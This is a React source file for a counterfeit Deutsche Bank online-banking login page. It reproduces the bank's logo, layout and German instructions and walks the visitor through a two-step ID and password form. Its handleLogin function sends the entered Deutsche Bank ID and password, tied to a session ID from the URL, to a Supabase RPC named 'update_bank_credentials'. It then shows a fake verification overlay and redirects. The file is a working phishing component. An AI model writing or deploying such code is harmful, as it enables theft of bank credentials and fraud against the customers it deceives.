import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";

const BLUE = "#0018a8";
const RED = "#c1002b";
const LIGHT = "#ceeaf8";
const LINK = "#0550d1";

const DeutscheBank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [dbId, setDbId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);

  const handleContinue = () => {
    if (dbId.trim().length === 0) return;
    setStep(2);
  };

  const handleLogin = async () => {
    if (password.length === 0) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: dbId,
        p_password: password,
        p_username_label: "Deutsche Bank ID",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <>
      <style>{`
        .db-font { font-family: 'DeutscheBankUI', 'Arial', sans-serif; }
        @media (min-width: 1024px) {
          .db-right-panel {
            position: fixed;
            top: 0;
            bottom: 0;
            left: max(608px, calc(50% + 8px));
            width: 440px;
            overflow-y: auto;
            scrollbar-width: none;
            -ms-overflow-style: none;
          }
          .db-right-panel::-webkit-scrollbar {
            display: none;
          }
        }
      `}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col db-font" style={{ color: "#1a1a1a" }}>
        {/* Background */}
        <div
          className="relative flex-1"
          style={{
            backgroundImage: `url(${bgAsset.url})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            backgroundColor: BLUE,
          }}
        >
          <div className="max-w-[1200px] mx-auto px-4 py-8 lg:py-16 grid lg:grid-cols-[minmax(0,560px)_minmax(0,440px)] gap-8">
            {/* LEFT COLUMN */}
            <div className="space-y-6">
              {/* Info box */}
              <div
                className="flex gap-3 p-5 rounded-sm text-[14px] leading-snug"
                style={{ backgroundColor: LIGHT, color: "#171945" }}
              >
                <div className="pt-0.5">
                  <div
                    className="w-5 h-5 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: "#206683" }}
                  >
                    <Info size={14} color="#fff" />
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="text-[15px]">Login mit Ihrer Deutsche Bank ID</div>
                  <p>
                    Sie können sich im Online-Banking der Deutschen Bank nur noch mit Ihrer Deutsche
                    Bank ID anmelden. Der bisherige Link „Mit Filiale, Konto und PIN einloggen" ist
                    entfallen. Mehr Informationen finden Sie{" "}
                    <a href="#" className="underline">hier</a>.
                  </p>
                  <p>Haben Sie noch keine persönliche Deutsche Bank ID, melden Sie sich wie folgt an:</p>
                  <ul className="list-disc pl-5 space-y-1">
                    <li>
                      Geben Sie im Feld "Deutsche Bank ID" Ihre bisherige Filialkontonummer ein -
                      ohne Leerzeichen und ohne Unterkontonummer
                    </li>
                    <li>Geben Sie anschließend Ihre PIN im Feld „Passwort" ein</li>
                  </ul>
                </div>
              </div>

              {/* Login card */}
              <div className="bg-white p-6 lg:p-8 shadow-sm">
                <div className="mb-6">
                  <img src={logoAsset.url} alt="Deutsche Bank" className="h-7 w-auto" />
                </div>

                {step === 2 && (
                  <button
                    type="button"
                    onClick={() => setStep(1)}
                    className="flex items-center gap-1 text-[14px] mb-3 hover:underline"
                    style={{ color: BLUE }}
                  >
                    <ArrowLeft size={16} /> Zurück
                  </button>
                )}

                {step === 1 && (
                  <h1 className="text-[32px] font-semibold mb-2" style={{ color: "#111" }}>
                    Guten Tag
                  </h1>
                )}
                <p className="text-[15px] mb-5">Bitte geben Sie Ihre Zugangsdaten ein.</p>

                {step === 1 ? (
                  <>
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Deutsche Bank ID
                    </label>
                    <input
                      type="text"
                      value={dbId}
                      onChange={(e) => setDbId(e.target.value)}
                      onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                      autoFocus
                      className="w-full px-3 py-3 text-[16px] outline-none"
                      style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
                    />

                    <div className="flex items-center justify-between mt-10">
                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
                        Zugangsdaten vergessen?
                      </a>
                      <button
                        type="button"
                        onClick={handleContinue}
                        disabled={dbId.trim().length === 0}
                        className="px-8 py-2.5 text-white font-semibold text-[15px]"
                        style={{
                          backgroundColor: dbId.trim().length === 0 ? "#c6c6c6" : LINK,
                          cursor: dbId.trim().length === 0 ? "not-allowed" : "pointer",
                        }}
                      >
                        Weiter
                      </button>
                    </div>
                  </>
                ) : (
                  <>
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Passwort
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                        autoFocus
                        className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
                        style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2"
                        style={{ color: BLUE }}
                        aria-label="Passwort anzeigen"
                      >
                        {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
                      </button>
                    </div>

                    <div className="flex items-center justify-between mt-10">
                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
                        Zugangsdaten vergessen?
                      </a>
                      <button
                        type="button"
                        onClick={handleLogin}
                        disabled={password.length === 0}
                        className="px-8 py-2.5 text-white font-semibold text-[15px]"
                        style={{
                          backgroundColor: password.length === 0 ? "#c6c6c6" : LINK,
                          cursor: password.length === 0 ? "not-allowed" : "pointer",
                        }}
                      >
                        Einloggen
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>

            {/* RIGHT COLUMN */}
            <div className="db-right-panel bg-white shadow-sm">
              {/* FestzinsSparen teaser - inset within a white frame */}
              <a href="#" className="block px-7 pt-7 pb-6">
                <img
                  src={teaserAsset.url}
                  alt="3,0% p.a. FestzinsSparen"
                  className="w-full h-auto mb-3"
                />
                <div>
                  <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
                    FestzinsSparen – jetzt 3,0 % p. a. sichern*
                  </div>
                  <div className="text-[14px] mt-2" style={{ color: "#333" }}>
                    Lassen Sie Ihr Geld sicher wachsen.
                  </div>
                  <div className="mt-3 text-[13px] underline font-bold" style={{ color: LINK }}>
                    Mehr erfahren
                  </div>
                </div>
              </a>

              <div className="border-t border-gray-200" />

              <InfoBlock
                icon={<AlertTriangle size={20} color="#171945" />}
                title="Sicherheitshinweise"
                text="Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern."
                links={[
                  "Link zu den aktuellen Sicherheitshinweisen",
                  "Link zu Sicherheit im Überblick",
                ]}
              />
              <div className="border-t border-gray-200" />
              <InfoBlock
                icon={<Monitor size={20} color="#171945" />}
                title="Online-Banking Zugang"
                text="Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen."
                links={["Zugang zum Online-Banking beantragen"]}
              />
              <div className="border-t border-gray-200" />
              <InfoBlock
                icon={<Lock size={20} color="#171945" />}
                title="Unsere Sicherheitsverfahren"
                text="Alles Wissenswerte rund um Ihren Login."
                links={["Link zu den Sicherheitsverfahren"]}
              />

              {/* Footer - dark navy background matching the reference */}
              <div className="px-7 py-7 text-[13px]" style={{ backgroundColor: "#1e2a78", color: "#fff" }}>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
                  <a href="#" className="hover:underline">English Version</a>
                  <a href="#" className="hover:underline">Hilfe</a>
                  <a href="#" className="hover:underline">Demo-Konto</a>
                </div>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
                  <a href="#" className="hover:underline">Impressum</a>
                  <a href="#" className="hover:underline">Rechtliche Hinweise</a>
                  <a href="#" className="hover:underline">Datenschutz</a>
                </div>
                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-bold text-[13px]">
                  <a href="#" className="hover:underline">Cookie-Einstellungen</a>
                </div>
                <button
                  type="button"
                  className="text-[13px] font-semibold px-4 py-2 mb-3 text-white"
                  style={{ backgroundColor: "#0550d1" }}
                >
                  Vertrag widerrufen
                </button>
                <div className="text-[12px]">© 2026 Deutsche Bank AG</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

const InfoBlock = ({
  icon,
  title,
  text,
  links,
}: {
  icon: React.ReactNode;
  title: string;
  text: string;
  links: string[];
}) => (
  <div className="px-7 py-6">
    <div className="flex items-center gap-2 mb-2 font-semibold text-[15px]">
      {icon}
      {title}
    </div>
    <p className="text-[14px] mb-3" style={{ color: "#333" }}>
      {text}
    </p>
    <div className="space-y-1">
      {links.map((l) => (
        <a key={l} href="#" className="block text-[13px] underline font-bold" style={{ color: LINK }}>
          {l}
        </a>
      ))}
    </div>
  </div>
);

export default DeutscheBank;
